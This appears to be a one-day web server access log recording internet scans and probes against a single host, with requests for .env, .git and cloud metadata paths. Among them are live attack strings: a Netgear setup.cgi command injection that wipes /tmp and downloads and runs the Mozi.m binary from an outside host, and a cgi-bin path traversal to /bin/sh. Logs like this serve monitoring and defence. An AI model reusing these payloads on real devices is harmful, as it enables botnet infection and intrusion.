72.14.148.3 - - [16/Jan/2025:00:29:55 +0000] "GET //.env HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
72.14.148.3 - - [16/Jan/2025:00:29:55 +0000] "GET / HTTP/1.1" 200 947 "http://34.94.250.181//.env" "Go-http-client/1.1"
178.215.236.132 - - [16/Jan/2025:00:46:41 +0000] "GET /.git/index HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 4.4.2; LGMS323 Build/KOT49I.MS32310b) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.103 Mobile Safari/537.36"
133.175.54.224 - - [16/Jan/2025:00:50:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [16/Jan/2025:00:53:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:00:53:52 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.181.190.248 - - [16/Jan/2025:01:15:40 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:01:15:40 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
46.19.138.234 - - [16/Jan/2025:02:00:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [16/Jan/2025:02:17:22 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
4.151.38.0 - - [16/Jan/2025:02:20:19 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
121.118.233.62 - - [16/Jan/2025:02:44:32 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [16/Jan/2025:03:18:45 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:03:18:45 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [16/Jan/2025:03:23:24 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [16/Jan/2025:03:23:26 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [16/Jan/2025:03:51:09 +0000] "\x16\x03\x01\x05\xa8\x01" 400 526 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:07:03 +0000] "" 400 526 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:07:16 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:08:11 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:09:35 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.237 - - [16/Jan/2025:04:10:45 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:15:41 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:16:52 +0000] "GET /index.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.237 - - [16/Jan/2025:04:17:57 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:19:12 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
205.210.31.53 - - [16/Jan/2025:04:19:46 +0000] "\x16\x03\x01" 400 526 "-" "-"
205.210.31.53 - - [16/Jan/2025:04:19:46 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:20:18 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:21:32 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.237 - - [16/Jan/2025:04:23:46 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.237 - - [16/Jan/2025:04:26:03 +0000] "GET /login.jsp HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.237 - - [16/Jan/2025:04:28:27 +0000] "GET /doc/index.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.237 - - [16/Jan/2025:04:29:41 +0000] "\x16\x03\x01" 400 526 "-" "-"
179.43.191.146 - - [16/Jan/2025:04:29:57 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [16/Jan/2025:04:30:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
104.234.115.237 - - [16/Jan/2025:04:30:54 +0000] "GET /remote/login HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
110.41.184.245 - - [16/Jan/2025:04:33:11 +0000] "GET /stalker_portal/c/xpcom.common.js HTTP/1.1\n" 400 526 "-" "-"
220.147.125.223 - - [16/Jan/2025:04:38:02 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [16/Jan/2025:05:10:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:05:10:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
51.158.205.47 - - [16/Jan/2025:05:12:05 +0000] "GET / HTTP/1.0" 200 1761 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
78.153.140.93 - - [16/Jan/2025:05:53:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:05:53:36 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
27.147.135.163 - - [16/Jan/2025:06:11:39 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
79.42.61.4 - - [16/Jan/2025:07:10:20 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [16/Jan/2025:07:34:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:07:34:28 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.225 - - [16/Jan/2025:07:40:42 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.105.128.12 - - [16/Jan/2025:07:45:43 +0000] "\x16\x03\x01" 400 526 "-" "-"
95.214.55.226 - - [16/Jan/2025:07:54:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.12.78.161 - - [16/Jan/2025:07:56:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
80.82.77.202 - - [16/Jan/2025:08:01:12 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
64.62.197.137 - - [16/Jan/2025:08:30:31 +0000] "\x16\x03\x01" 400 526 "-" "-"
46.19.138.234 - - [16/Jan/2025:08:45:32 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
178.215.236.132 - - [16/Jan/2025:09:26:13 +0000] "GET /.git/HEAD HTTP/1.1" 302 350 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1"
198.235.24.29 - - [16/Jan/2025:09:34:45 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.93 - - [16/Jan/2025:09:56:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:09:56:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
190.111.182.71 - - [16/Jan/2025:10:08:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
179.43.191.146 - - [16/Jan/2025:10:13:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [16/Jan/2025:10:30:13 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:10:30:14 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
167.172.72.201 - - [16/Jan/2025:10:51:07 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.93 - - [16/Jan/2025:10:51:20 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:10:51:21 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
167.172.72.201 - - [16/Jan/2025:10:51:36 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
206.189.152.11 - - [16/Jan/2025:10:59:04 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [16/Jan/2025:10:59:33 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
168.232.12.246 - - [16/Jan/2025:11:01:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
167.172.90.143 - - [16/Jan/2025:11:03:39 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [16/Jan/2025:11:04:04 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [16/Jan/2025:11:04:08 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
167.172.72.201 - - [16/Jan/2025:11:04:15 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
35.203.211.45 - - [16/Jan/2025:12:01:09 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
159.223.205.208 - - [16/Jan/2025:12:13:03 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.19 Safari/537.36 OPR/64.0.3409.0 (Edition developer)"
104.152.52.208 - - [16/Jan/2025:12:23:33 +0000] "GET / HTTP/1.0" 200 1761 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
185.196.220.253 - - [16/Jan/2025:12:30:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
64.62.197.65 - - [16/Jan/2025:12:31:57 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0"
64.62.197.76 - - [16/Jan/2025:12:33:52 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0"
64.62.197.66 - - [16/Jan/2025:12:34:21 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0"
5.181.190.248 - - [16/Jan/2025:12:53:49 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:12:53:50 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.93 - - [16/Jan/2025:13:04:04 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:13:04:05 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.59.101.104 - - [16/Jan/2025:13:27:42 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
183.99.217.71 - - [16/Jan/2025:13:50:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
3.144.116.195 - - [16/Jan/2025:13:58:10 +0000] "GET //.env HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
3.144.116.195 - - [16/Jan/2025:13:58:10 +0000] "GET / HTTP/1.1" 200 947 "http://34.94.250.181//.env" "Go-http-client/1.1"
78.153.140.93 - - [16/Jan/2025:14:15:01 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:14:15:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [16/Jan/2025:14:46:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.178.110.224 - - [16/Jan/2025:14:57:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
95.214.55.226 - - [16/Jan/2025:15:10:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
52.228.154.220 - - [16/Jan/2025:15:39:29 +0000] "GET /manager/text/list HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
5.181.190.248 - - [16/Jan/2025:15:39:50 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:15:39:51 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.93 - - [16/Jan/2025:16:10:51 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:16:10:51 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.148.10.242 - - [16/Jan/2025:16:18:44 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.191.146 - - [16/Jan/2025:16:23:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.13.224.222 - - [16/Jan/2025:16:31:10 +0000] "GET /.env HTTP/1.1" 302 350 "-" "BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103"
220.84.192.131 - - [16/Jan/2025:16:33:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
4.151.38.185 - - [16/Jan/2025:16:46:53 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
95.214.55.226 - - [16/Jan/2025:17:01:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
170.64.159.7 - - [16/Jan/2025:17:01:35 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
170.64.159.7 - - [16/Jan/2025:17:02:26 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:17:24:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:17:24:53 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.206.147.216 - - [16/Jan/2025:17:37:30 +0000] "MGLNDD_34.94.250.181_80\n" 400 526 "-" "-"
167.94.145.111 - - [16/Jan/2025:17:55:08 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.145.111 - - [16/Jan/2025:17:55:12 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.111 - - [16/Jan/2025:17:55:12 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.111 - - [16/Jan/2025:17:55:14 +0000] "GET / HTTP/1.1" 200 966 "http://181.250.94.34.bc.googleusercontent.com/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.111 - - [16/Jan/2025:17:55:15 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
103.233.123.233 - - [16/Jan/2025:18:01:33 +0000] "GET http://metadata.google.internal/computeMetadata/v1/project/ HTTP/1.1" 302 331 "-" "-"
103.233.123.233 - - [16/Jan/2025:18:01:33 +0000] "GET http://169.254.169.254/computeMetadata/v1/project/ HTTP/1.1" 302 331 "-" "-"
195.3.223.40 - - [16/Jan/2025:18:37:44 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
161.35.182.161 - - [16/Jan/2025:18:39:40 +0000] "\x16\x03\x01" 400 526 "-" "-"
161.35.182.161 - - [16/Jan/2025:18:39:40 +0000] "\x16\x03\x01" 400 526 "-" "-"
161.35.182.161 - - [16/Jan/2025:18:39:40 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:40 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
80.82.77.202 - - [16/Jan/2025:19:06:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre"
205.210.31.32 - - [16/Jan/2025:19:28:09 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.148.10.242 - - [16/Jan/2025:19:30:56 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.240.127.158 - - [16/Jan/2025:19:36:57 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
78.153.140.93 - - [16/Jan/2025:19:41:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:19:41:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
104.207.51.58 - - [16/Jan/2025:19:56:15 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.207.32.8 - - [16/Jan/2025:19:56:15 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.207.57.169 - - [16/Jan/2025:19:56:16 +0000] "\x16\x03\x01" 400 526 "-" "-"
80.82.77.202 - - [16/Jan/2025:20:05:16 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
172.169.5.242 - - [16/Jan/2025:20:11:37 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
49.0.65.53 - - [16/Jan/2025:20:17:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
14.182.220.219 - - [16/Jan/2025:20:35:49 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://14.182.220.219:60585/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
95.214.55.226 - - [16/Jan/2025:20:41:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.196.220.253 - - [16/Jan/2025:20:50:21 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
3.134.109.31 - - [16/Jan/2025:20:51:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.134.109.31 - - [16/Jan/2025:20:51:56 +0000] "\x16\x03\x01" 400 526 "-" "-"
18.216.4.246 - - [16/Jan/2025:20:55:27 +0000] "\x16\x03\x01" 400 526 "-" "-"
18.216.4.246 - - [16/Jan/2025:20:56:13 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
46.19.138.234 - - [16/Jan/2025:20:57:16 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [16/Jan/2025:21:11:14 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:21:11:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
130.61.239.224 - - [16/Jan/2025:21:13:38 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
